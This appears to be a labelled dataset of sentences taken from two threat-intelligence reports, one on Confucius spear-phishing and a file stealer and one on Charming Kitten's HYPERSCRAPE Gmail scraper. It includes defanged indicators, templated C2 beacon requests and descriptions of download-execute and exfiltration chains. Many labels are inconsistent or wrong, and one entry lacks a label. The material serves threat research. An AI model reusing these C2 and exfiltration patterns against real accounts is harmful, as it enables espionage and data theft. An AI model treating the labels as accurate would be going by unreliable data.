text: Two days later, a second email — purportedly a warning from a Pakistani military about the Pegasus spyware — containing a cutt.ly link to a malicious encrypted Word document and the password for decryption will be sent to the target.
label: malware

text: The sender address impersonates a service similar to that on the first email (alert@ispr.gov.pk).       Figure 1.
label: EMAIL

text: Spear-phishing email from early August.
label: TIME

text: Notice the insertion of logos from the Pakistani Army, Air Force, Navy, and PR department.
label: identity

text: If the target clicks on either the link or on the “unsubscribe” link, it will download a Word document from the domain parinari[.]xyz.
label: DOMAIN

text: The emails are sent either from an ExpressVPN exit node in Pakistan, or from a mail server under the attacker’s control.
label: SOFTWARE

text: Examining the encrypted document containing macros After entering the password mentioned in the message, a document containing macros is displayed on screen.
label: safe

text: Figure 2. Malicious document containing macros
label: attack-pattern

text: If the victim enables macros, the malicious code will be loaded.
label: safe

text: If the victim enters any phone number and clicks “SUBMIT,” the text field will be replaced by the message “Phone Number Not Found.”
label: safe

text: Behind the scenes, a .NET DLL file named skfk.txt, which is filled with content found inside the “Comments” property of the document, is created in the temporary directory.
label: FILEPATH

text: The file is then loaded in memory via PowerShell.
label: tools

text: Stage 1 is a simple download & execute program.
label: safe

text: It downloads an ASCII file from the same domain and converts it into binary before loading it on to the memory and jump to a dynamic function.
label: safe

text: Stage 2 is also .NET DLL file that downloads a third file from parinari[.]xyz, converts it from ASCII to binary, and then creates a scheduled task to load it.
label: DOMAIN

text: Stage 3 is similar to stage 1, with the only change being the URL to retrieve the next stage.
label: safe

text: Stage 4 is the final payload (analyzed in the next section).
label: safe

text: it is never written in clear text to the file disk.
label: safe

text: File stealer loading scheme
label: safe

text: It should be noted that most of the compilation timestamps of these DLL files have been modified by the attacker to a year in the far future (2060, 2099 …), and the server IP addresses are often hidden behind CloudFlare.
label: SOFTWARE

text: Analysis of the file stealer
label: safe

text: The final payload is a .NET DLL file designed to steal documents and images with the following extensions:  File extension  Description  TXT  Text file  PDF  PDF file  PNG  Image file in PNG format  JPG  Image file in JPG format  DOC  Word document  XLS  Excel document  XLM  Excel document with macros  ODP  OpenDocument Presentation  ODS  OpenDocument Sheet  ODT  OpenDocument Text  RTF  Rich Text Format file  PPT  PowerPoint document  XLSX  Excel document  XLSM  Excel document with macros  DOCX  Word document  PPTX  PowerPoint document  JPEG  Image file in JPEG format
label: safe

text: The “Documents,” “Downloads,” “Desktop,” and “Pictures” folders of every user
label: safe

text: are checked.
label: safe

text: The DLL file also examines drives other than C:
label: safe

text: .      Figure 4. Code showing the main function of the file stealer
label: safe

text: When a file matching one of the listed extensions is found, its MD5 hash is calculated and compared to an exclusion list retrieved from the command-and-control (C&C) server pirnaram[.]xyz.
label: DOMAIN

text: If the hash is not listed, the file is sent via the C&C to a directory named after the concatenation of the machine name and the username.
label: safe

text: The exclusion list is different for every machine name-username string.
label: safe

text: Other campaigns
label: safe

text: During our monitoring of Confucius, we came across a campaign delivering the same payload, using a different lure.
label: safe

text: In this instance, the campaign impersonated the Pakistani Defense Housing Authority.
label: identity

text: Again, this threat actor’s interest in military personnel is obvious.
label: safe

text: Spear-phishing email from early August
label: attack-pattern

text: The lures used in an older campaign from April 2021 impersonated the Federal Board of Revenue.
label: TIME

text: There were minor differences in tools, tactics, and procedures: the malicious document was directly attached to the spear phishing email — still encrypted — and the decryption password was sent in a different email.
label: attack-pattern

text: The first stage was also hidden in the “Comments” section.
label: safe

text: However, the second stage contained the final payload, which was once again a file stealer with the exact same structure (a .NET DLL).
label: safe

text: Instead of exfiltrating the files through PHP scripts, they were done via FTP server.
label: safe

text: It should be noted that in some occasions, the threat actor sent spear-phishing emails from the domain name mailerservice[.]directory which we attributed to the Patchwork threat actor in previous research.
label: attack-pattern

text: We disclosed multiple links between Patchwork and Confucius threat actors in the past, so this came as no surprise to us.
label: threat-actor

text: The creative use of social engineering lures and how to defend against them
label: attack-pattern

text: In our previous research, we already found Confucius, which is known for targeting Pakistan military for espionage purposes, employing multiple file stealers.
label: threat-actor

text: While the code quality of its payloads is not of the highest standard, this threat actor uses innovative techniques when crafting its malicious documents, such as  hiding malicious code in the comments section, or using encrypted documents to prevent automatic analysis.
label: safe

text: Therefore, it’s highly likely that Confucius will continue to experiment and try out different kinds of social engineering lures in future campaigns.
label: safe

text: Despite the variety of lures used by the threat actor, best security practices still apply to these attacks.
label: safe

text: Users should always be wary and avoid clicking on any link or downloading any file from unsolicited emails or suspicious sources.
label: attack-pattern

text: Red flags such as unusual sender domains or grammatical and spelling errors are also a sign that the email is malicious in nature, or at the very least, should be approached with proper security protocols in mind.
label: safe

text: The following security solutions can also protect users from email-based attacks:  Trend Micro™ Cloud App Security – Enhances the security of Microsoft Office 365 and other cloud services via computer vision and real-time scanning.
label: SOFTWARE

text: It also protects organizations from email-based threats.
label: safe

text: Trend Micro™ Deep Discovery™ Email Inspector – Defends users through a combination of real-time scanning and advanced analysis techniques for known and unknown attacks. label: malware

text: Trojan.W97M.CONFUCIUS.B  654c7021a4482da21e149ded58643b279ffbce66badf1a0a7fc3551acd607312  Trojan.W97M.CONFUCIUS.C  712172b5b1895bbfcced961a83baa448e26e93e301be407e6b9dc8cb6526277f  Trojan.Win32.DLOADR.TIOIBELQ
label: SHA2

text: URLs/Domains/IP Addresses      Server hosting malicious documents  parinari[.]xyz  Server used for file exfiltration  pirnaram[.]xyz  Domain names linked to other campaigns
label: DOMAIN

text: pemra[.]email  ispr[.]email  fbr[.]news  defencepk[.]email  pakistanarmy[.]email  pmogovpk[.]email  mailerservice[.]directory  file-dnld[.]com  funtifu[.]live  cnic-update[.]com  cnic-ferify[.]live  fbr-update[.]com  download.fbr[.]tax  support-team[.]tech  api.priveetalk[.]com       Sender email addresses      latest_info@fbr.news  notice@fbr.news  alert@fbr.news  thenewsinernational@mailerservice.directory
label: EMAIL

text: Tags  APT & Targeted Attacks | Cyber Crime | Research | Articles, News, Reports
label: safe

text: As part of TAG's mission to counter serious threats to Google and our users, we've analyzed a range of persistent threats including APT35 and Charming Kitten, an Iranian government-backed group that regularly targets high risk users.
label: identity

text: For years, we have been countering this group’s efforts to hijack accounts, deploy malware, and their use of novel techniques to conduct espionage aligned with the interests of the Iranian government.
label: attack-pattern

text: Now, we’re shining light on a new tool of theirs.
label: safe

text: In December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data from Gmail, Yahoo!, and Microsoft Outlook accounts.
label: threat-actor

text: The attacker runs HYPERSCRAPE on their own machine to download victims’ inboxes using previously acquired credentials.
label: malware

text: The oldest known sample is from 2020, and the tool is still under active development.
label: TIME

text: We have taken actions to re-secure these accounts and have notified the victims through our Government Backed Attacker Warnings.
label: safe

text: This post will provide technical details about HYPERSCRAPE, similar to PWC’s recently published analysis on a Telegram grabber tool.
label: malware

text: HYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining purpose-built capabilities.
label: threat-actor

text: Like much of their tooling, HYPERSCRAPE is not notable for its technical sophistication, but rather its effectiveness in accomplishing Charming Kitten’s objectives.
label: malware

text: HYPERSCRAPE requires the victim’s account credentials to run using a valid, authenticated user session the attacker has hijacked, or credentials the attacker has already acquired.
label: malware

text: It spoofs the user agent to look like an outdated browser, which enables the basic HTML view in Gmail.
label: SOFTWARE

text: Once logged in, the tool changes the account’s language settings to English and iterates through the contents of the mailbox, individually downloading messages as .eml files and marking them unread.
label: safe

text: After the program has finished downloading the inbox, it reverts the language back to its original settings and deletes any security emails from Google.
label: SOFTWARE

text: Earlier versions contained the option to request data from Google Takeout, a feature which allows users to export their data to a downloadable archive file.
label: SOFTWARE

text: The tool is written in .NET for Windows PCs and is designed to run on the attacker's machine.
label: SOFTWARE

text: We tested HYPERSCRAPE in a controlled environment with a test Gmail Account, although functionality may differ for Yahoo! and Microsoft accounts.
label: malware

text: HYPERSCRAPE won't run unless in a directory with other file dependencies.
label: malware

text: When launched, the tool makes an HTTP GET request to a C2 to check for a response body of "OK'' and will terminate if it's not found.
label: safe

text: In the version tested, the C2 was unobfuscated and stored as a hardcoded string.
label: safe

text: In later versions it was obfuscated with Base64.
label: safe

text: GET http://{C2}/Index.php?Ck=OK HTTP/1.1
label: URL

text: Host: {C2}
label: safe

text: Accept-Encoding: gzip Connection: Keep-Alive
label: safe

text: The tool accepts arguments from the command line such as the mode of operation, an identifier string, and a path string to a valid cookie file.
label: safe

text: A new form is displayed if the information is not provided via command prompt.
label: safe

text: Once provided, the data in the "Identity" field is sent to a C2 for confirmation.
label: safe

text: Again, the response is expected to be "OK".
label: safe

text: GET http://{C2}/Index.php?vubc={identity} HTTP/1.1
label: URL

text: Host: {C2} Accept-Encoding: gzip
label: safe

text: If the cookie file path was not supplied via the command line, a new form will allow the operator to do so using drag and drop.
label: safe

text: After parsing, the cookies are inserted into a local cache used by the embedded web browser.
label: safe

text: A new folder named "Download" is created adjacent to the main binary.
label: safe

text: The browser then navigates to Gmail to begin the data collection.
label: safe

text: The user agent is spoofed so it appears like an outdated browser, which results in an error message and allows the attacker to enable the basic HTML view in Gmail.
label: SOFTWARE

text: If the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter credentials to proceed, as the program will wait until it finds the inbox page.
label: safe

text: Once the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to English, changing it if not.
label: malware

text: The language is returned to its original setting when the run is finished.

text: TAG is committed to sharing research to raise awareness on bad actors like Charming Kitten within the security community, and for companies and individuals that may be targeted.
label: identity

text: It’s why we do things like work with our CyberCrime Investigation Group to share critical information relevant to law enforcement.
label: identity

text: We hope doing so will improve understanding of tactics and techniques that will enhance threat hunting capabilities and lead to stronger protections across the industry.
label: safe

text: We’ll also continue to apply those findings internally to improve the safety and security of our products so we can effectively combat threats and protect users who rely on our services.
label: safe

text: In the meantime, we encourage high risk users to enroll in our Advanced Protection Program (APP) and utilize Google Account Level Enhanced Safe Browsing to ensure they have the greatest level of protection in the face of ongoing threats.
label: safe
